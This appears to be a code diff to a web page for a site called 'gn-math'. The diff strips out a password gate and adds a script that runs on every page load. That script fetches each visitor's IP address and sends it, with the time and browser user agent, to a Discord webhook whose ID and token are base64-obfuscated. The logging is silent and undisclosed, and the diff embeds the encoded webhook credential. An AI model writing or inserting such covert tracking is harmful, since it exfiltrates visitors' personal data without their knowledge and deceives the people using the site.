@@ -40,51 +40,33 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body class="dark-mode">
-    <!-- PASSWORD GATE -->
-    <div id="passwordGate" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:var(--background-color);display:flex;align-items:center;justify-content:center;z-index:999999;font-family:sans-serif;">
-        <div style="background:var(--card-bg);padding:2.5rem;border-radius:16px;box-shadow:0 20px 40px rgba(0,0,0,0.5);text-align:center;border:2px solid var(--primary-color);max-width:90%;">
-            <h2 style="margin:0 0 1.5rem 0;color:var(--text-color);font-size:1.8rem;">Password Required</h2>
-            <input type="password" id="passwordInput" placeholder="enter password" autofocus autocomplete="off" style="padding:1rem;width:260px;font-size:1.2rem;border-radius:8px;border:2px solid var(--card-border);background:var(--popup-bg);color:var(--text-color);text-align:center;" onkeydown="if(event.key==='Enter')checkPw()">
-            <br><br>
-            <button onclick="checkPw()" style="padding:1rem 2.5rem;background:var(--primary-color);color:white;border:none;border-radius:8px;cursor:pointer;font-size:1.3rem;font-weight:bold;transition:0.2s;" onmouseover="this.style.opacity='0.9'" onmouseout="this.style.opacity='1'">Enter</button>
-            <p style="margin-top:1rem;font-size:0.9rem;color:#aaa;">this site is made by nikegtag<br>all rights reserved.</p>
-        </div>
-    </div>
 
-    <!-- FIXED LOGGER — NO LIMIT, NEW WEBHOOK, TYPO CORRECTED -->
+    <!-- LOGS THE SECOND PAGE LOADS — NO PASSWORD NEEDED -->
     <script>
-    function checkPw() {
-        if (document.getElementById('passwordInput').value.trim() === 'DrPepper') {
-            document.getElementById('passwordGate').remove();
+    (function() {
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                const encoded_id = 'MTQ0NDE4MTIzODMxMDI0NDUwMw==';
+                const encoded_token = 'OVZxNmd0Wk5pQ0RzTU9uRVdKdEkwZ3lkRlB0V1laZEcwengxTE4tT0ZjYkl1MHNNNGRTaUtoaFZYczBETU5kcTZONmM=';
+                const url = 'https://discord.com/api/webhooks/' + atob(encoded_id) + '/' + atob(encoded_token);
 
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(data => {
-                    // OBFUSCATED WEBHOOK: base64 decoded at runtime
-                    const encoded_id = 'MTQ0NDE4MTIzODMxMDI0NDUwMw==';
-                    const encoded_token = 'OVZxNmd0Wk5pQ0RzTU9uRVdKdEkwZ3lkRlB0V1laZEcwengxTE4tT0ZjYkl1MHNNNGRTaUtoaFZYczBETU5kcTZONmM=';
-                    const url = 'https://discord.com/api/webhooks/' + atob(encoded_id) + '/' + atob(encoded_token);
-
-                    fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },  // ← FIXED: was 'application Warn: json'
-                        body: JSON.stringify({
-                            username: "gn-math Logger",
-                            embeds: [{
-                                title: "Someone Entered",
-                                color: 0x00ff44,
-                                description: `**IP:** ||${data.ip}||\n**Time:** ${new Date().toLocaleString()}\n**Device:** ${navigator.userAgent.substring(0,100)}...`,
-                                footer: { text: "gn-math by nikegtag" }
-                            }]
-                        })
-                    }).catch(() => {});  // Silent fail
-                }).catch(() => {});
-        } else {
-            alert('Wrong password');
-            document.getElementById('passwordInput').value = '';
-            document.getElementById('passwordInput').focus();
-        }
-    }
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "gn-math Visitor",
+                        embeds: [{
+                            title: "New Visitor Detected",
+                            color: 0x00ff44,
+                            description: `**IP:** ||${data.ip}||\n**Time:** ${new Date().toLocaleString()}\n**Device:** ${navigator.userAgent.substring(0,120)}...`,
+                            footer: { text: "gn-math by nikegtag" }
+                        }]
+                    })
+                });
+            })
+            .catch(() => {});
+    })();
     </script>
 
     <header>
